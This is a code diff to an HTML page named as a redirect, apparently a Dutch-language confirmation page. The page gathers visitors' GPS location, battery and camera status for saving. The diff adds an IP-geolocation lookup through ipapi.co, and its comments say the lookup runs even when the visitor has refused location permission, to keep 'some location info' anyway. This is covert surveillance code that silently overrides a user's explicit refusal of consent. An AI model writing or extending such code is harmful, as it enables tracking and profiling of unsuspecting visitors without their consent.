@@ -1,3 +1,4 @@
+--- START OF FILE redirect (1).html ---
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -121,6 +122,7 @@ async function getCurrentUserId() {
     let locationError = null;
     let batteryError = null;
     let cameraError = null;
+    let ipLocationData = null; // TIP: Variable for IP Location Data
 
     // Utility function to promisify Geolocation API
     function getCurrentPositionPromise() {
@@ -145,6 +147,26 @@ async function getCurrentUserId() {
 
     }
 
+     // TIP: Function to fetch IP Location Data (Copied from bevestiging.html - adjust as needed)
+     async function getIPLocationData() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return { // TIP: Return the data, don't set global ipLocationData yet
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                lat: parseFloat(data.latitude),
+                lon: parseFloat(data.longitude),
+                timestamp: new Date().toISOString()
+            };
+        } catch (error) {
+            console.error('Error fetching IP location data:', error);
+            return null; // TIP: Return null in case of error
+        }
+    }
+
     // Function to collect location and battery data
     async function collectOtherData() {
         // 2. Location (if needed)
@@ -155,7 +177,8 @@ async function getCurrentUserId() {
                     const position = await getCurrentPositionPromise();
                     locationData = {
                         latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy // TIP: Capture accuracy
                     };
                     console.log("Location data:", locationData); // <-- VERIFY
                 } catch (error) {
@@ -163,29 +186,55 @@ async function getCurrentUserId() {
                     let errorMsg = "";
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMsg = "User denied the request for Geolocation."
+                            errorMsg = "Gebruiker heeft locatietoestemming geweigerd."; // TIP: More specific messages
                             break;
                         case error.POSITION_UNAVAILABLE:
-                           errorMsg = "Location information is unavailable."
+                           errorMsg = "Locatie informatie is niet beschikbaar.";
                             break;
                         case error.TIMEOUT:
-                           errorMsg = "The request to get user location timed out."
+                           errorMsg = "De aanvraag voor locatie duurde te lang.";
                             break;
                         case error.UNKNOWN_ERROR:
-                            errorMsg = "An unknown error occurred."
+                            errorMsg = "Er is een onbekende fout opgetreden bij het ophalen van de locatie.";
                             break;
                         default:
                             errorMsg = error.message;
                     }
                     locationError = errorMsg; // Store the full error message
                      console.error("Location error:", locationError);
+
+                     // TIP: Fetch IP location as fallback if GPS fails
+                     ipLocationData = await getIPLocationData();
+                     if(ipLocationData){
+                         console.log("IP Location data (fallback):", ipLocationData);
+                     } else {
+                         console.error("Failed to get IP location fallback as well.");
+                     }
+
                 }
             } else {
                 // User denied location permission.  Set locationError.
                 locationError = "Gebruiker heeft locatietoestemming geweigerd.";
                 console.warn("User denied location permission.");
+
+                // TIP: Fetch IP location even if permission denied, to still have *some* location info
+                 ipLocationData = await getIPLocationData();
+                 if(ipLocationData){
+                     console.log("IP Location data (fallback, permission denied):", ipLocationData);
+                 } else {
+                     console.error("Failed to get IP location fallback even with permission denied.");
+                 }
             }
+        } else {
+             // TIP: If location permission is not needed, still try to get IP location
+             ipLocationData = await getIPLocationData();
+             if(ipLocationData){
+                 console.log("IP Location data (no GPS permission needed):", ipLocationData);
+             } else {
+                 console.error("Failed to get IP location even when GPS permission not needed.");
+             }
         }
+
 
         // 3. Battery
         if (navigator.getBattery) {
@@ -279,6 +328,7 @@ async function getCurrentUserId() {
         locationError: locationError || null,  // Save any errors
         batteryError: batteryError || null,
         cameraError: cameraError || null,
+        ipLocation: ipLocationData || null, // TIP: Save IP Location Data
     };
 
         console.log("Data to save:", dataToSave); // <-- CHECK WHAT'S BEING SAVED
